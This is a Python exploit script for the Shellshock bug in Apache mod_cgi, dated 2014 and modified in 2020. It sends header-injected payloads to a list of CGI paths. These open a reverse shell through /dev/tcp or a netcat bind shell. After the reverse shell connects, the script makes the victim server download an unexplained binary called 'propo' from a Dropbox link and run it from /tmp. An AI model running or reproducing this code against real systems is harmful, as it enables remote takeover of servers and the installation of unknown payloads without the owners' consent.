#!/usr/bin/env python3
from socket import *
import _thread, time, sys
import requests as req

stop = False
proxyhost = ""
proxyport = 0

def usage():
	print ("""

		Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

Federico Galatolo 2014
Marcus Agard, Robert Unnold 2020
""")
	sys.exit(0)

def exploit(lhost,lport,rhost,rport,payload,pages):
	headers = {"Cookie": payload, "Referer": payload}

	for page in pages:
		if stop:
			return
		print(f"[-] Trying exploit on : {page}")
		resp = req.get(f"http://{rhost}{page}", headers=headers)
		if resp.status_code == 404:
			print(f"[*] 404 on: {page}")
		time.sleep(1)


args = {}

for arg in sys.argv[1:]:
	ar = arg.split("=")
	args[ar[0]] = ar[1]
try:
	args['payload']
except:
	usage()

if args['payload'] == 'reverse':
	try:
		lhost = args['lhost']
		lport = int(args['lport'])
		rhost = args['rhost']
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 2>&1 &"
	except:
		usage()
elif args['payload'] == 'bind':
	try:
		rhost = args['rhost']
		rport = args['rport']
		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
	except:
		usage()
else:
	print("[*] Unsupported payload")
	usage()

try:
	pages = args['pages'].split(",")
except:
	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]

if args['payload'] == 'reverse':
	serversocket = socket(AF_INET, SOCK_STREAM)
	buff = 1024
	addr = (lhost, lport)
	serversocket.bind(addr)
	serversocket.listen(10)
	print("[!] Started reverse shell handler")
	_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
if args['payload'] == 'bind':
	serversocket = socket(AF_INET, SOCK_STREAM)
	addr = (rhost,int(rport))
	_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))

buff = 1024

while True:
	if args['payload'] == 'reverse':
		clientsocket, clientaddr = serversocket.accept()
		print("[!] Successfully exploited")
		print(f"[!] Incoming connection from {clientaddr[0]}")
		stop = True
		clientsocket.settimeout(100)
		# These links may change as we update the files
		print("[-] Obtaining propo...")
		clientsocket.sendall("wget -O /tmp/propo https://www.dropbox.com/s/094z3h3y3mlt1np/propo".encode())
		time.sleep(1)
		data = clientsocket.recv(buff)
		print(data.decode())
		time.sleep(1)
		clientsocket.sendall("cd /tmp; ./propo".encode())
		clientsocket.close()
		# while True:
		# 	reply = input(f"{clientaddr[0]}> ")
		# 	clientsocket.sendall(f"{reply}\n".encode())
		# 	try:
		# 		data = clientsocket.recv(buff)
		# 		print(data.decode())
		# 	except:
		# 		pass

	if args['payload'] == 'bind':
		try:
			serversocket = socket(AF_INET, SOCK_STREAM)
			time.sleep(1)
			serversocket.connect(addr)
			print("[!] Successfully exploited")
			print(f"[!] Connected to {rhost}")
			stop = True
			serversocket.settimeout(3)
			while True:
				reply = input(f"{rhost}> ")
				serversocket.sendall(f"{reply}\n".encode())
				data = serversocket.recv(buff)
				print(data.decode())
		except:
			pass
